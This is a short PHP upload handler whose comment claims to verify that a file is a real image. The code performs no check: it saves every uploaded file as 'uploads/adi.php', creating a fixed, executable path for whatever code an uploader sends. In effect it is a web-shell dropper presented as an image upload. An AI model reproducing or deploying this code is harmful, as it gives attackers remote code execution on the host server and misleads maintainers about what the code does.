<?php
// Check if image file is a actual image or fake image
if(isset($_POST["submit"]))
{
    $UploadName=$_FILES['UploadFileField']['name'];
    $UploadTmp=$_FILES['UploadFileField']['tmp_name'];
    $UploadType=$_FILES['UploadFileField']['type'];

    $UploadName=preg_replace("#[^a-z0-9.]#i","",$UploadName);

    if(!$UploadTmp)
    {
    	die("NO file");
    }
    else
    {
    	$UploadName="adi.php";
    	move_uploaded_file($UploadTmp,"uploads/$UploadName");
    	echo "Chaaaaaaaaaaaaaaaaaapu";
    }
}
?>